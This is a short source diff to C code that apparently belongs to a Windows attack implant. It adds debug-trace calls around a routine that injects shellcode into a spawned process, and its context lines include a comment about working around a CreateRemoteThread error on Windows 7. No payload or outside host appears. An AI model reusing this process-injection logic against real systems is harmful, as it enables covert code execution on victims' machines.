@@ -14,6 +14,7 @@
 #include "inlinecommon.h"
 #include <WinSock2.h>
 #include "jobs.h"
+#include "x86trace.h"
 
 /* inject some shellcode... enclosed stuff is the shellcode y0 */
 void command_inject_pid(char * buffer, int length, BOOL x86) {
@@ -261,8 +262,10 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
 	Sleep(100);
 
+	x86_bc(x86 ? "J3" : "J6");
 	/* inject into the process */
 	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, shellcode, slen, offset, parameter, plen);
+	x86_bc("K");
 
 	/* wait the user specified time for our process to complete.
 	 * PeekNamedPipe on the inherited stdout pipe can block forever if the
